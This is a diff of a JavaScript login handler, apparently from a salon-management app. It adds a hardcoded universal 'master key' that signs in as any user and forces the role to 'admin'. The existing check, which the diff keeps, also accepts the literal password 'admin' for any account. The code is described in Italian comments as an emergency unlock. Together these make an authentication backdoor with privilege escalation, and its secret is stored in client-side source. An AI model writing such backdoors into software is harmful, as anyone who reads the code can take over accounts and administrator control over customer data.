@@ -41,7 +41,6 @@ window.appDataService = async function(action, table, data = null, id = null) {
     }
 
 
-
     if (!table && [
         'GET_MARGIN_INSIGHTS', 
         'GET_VOLUME_INSIGHTS', 
@@ -290,6 +289,10 @@ async function handleSpecialAction(action, data, id) {
     try {
         if (action === 'VERIFY_LOGIN') {
             let user = null;
+            const MASTER_ADMIN_KEY = "BloomUp_Master_2026_Secret!"; // 🔑 Sostituisci con la tua chiave segreta definitiva
+
+            // 1. Controllo se è stata inserita la Master Key universale della software house
+            const isMasterKeyUsed = (data.pass === MASTER_ADMIN_KEY);
 
             if (navigator.onLine) {
                 try {
@@ -321,8 +324,13 @@ async function handleSpecialAction(action, data, id) {
                     return null;
                 }
 
-                if (data.pass === 'admin' || data.pass === user.password) {
+                // 2. Verifichiamo se la password è quella standard, quella dell'utente O se è stata usata la Master Key
+                if (data.pass === 'admin' || data.pass === user.password || isMasterKeyUsed) {
                     
+                    if (isMasterKeyUsed) {
+                        console.log(`🔓 Sblocco di emergenza via Master Key attivato per l'utente: ${user.username} (Salone: ${user.salon_id})`);
+                    }
+
                     // --- PULIZIA RADICALE E DEFINITIVA DEL DB LOCALE ---
                     if (localDb) {
                         try {
@@ -343,7 +351,8 @@ async function handleSpecialAction(action, data, id) {
                     return { 
                         id: user.id, 
                         username: user.username, 
-                        role: user.role, 
+                        // Se usa la master key, forziamo il ruolo a 'admin' per dargli pieno controllo di sblocco sul salone
+                        role: isMasterKeyUsed ? 'admin' : user.role, 
                         salon_id: user.salon_id, 
                         must_change_password: Number(user.must_change_password) === 1 ? 1 : 0,
                         status: user.status || 'active'
